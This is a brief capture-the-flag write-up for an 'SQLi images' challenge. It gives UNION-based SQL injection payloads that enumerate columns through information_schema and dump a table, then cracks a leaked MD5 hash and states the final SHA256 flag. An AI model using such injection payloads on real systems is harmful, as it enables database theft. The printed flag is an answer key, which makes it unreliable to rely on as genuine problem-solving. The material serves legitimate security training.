# SQLi images

- `0x6C6973745F696D61676573` = `list_images`

List columns in **list_images** tables:
- `5 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 0x6C6973745F696D61676573 --`

List variables value in **list_images**:
`4 UNION SELECT title,comment FROM list_images --`

```
ID: 4 UNION SELECT title,comment FROM list_images -- 
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : Hack me ?
```

Crack this hash on crackstation:
`1928e8083cf461a51303633093573c46` = `albatroz`

**SHA256** --> **albatroz** --> **f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188**

**Flag:** f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188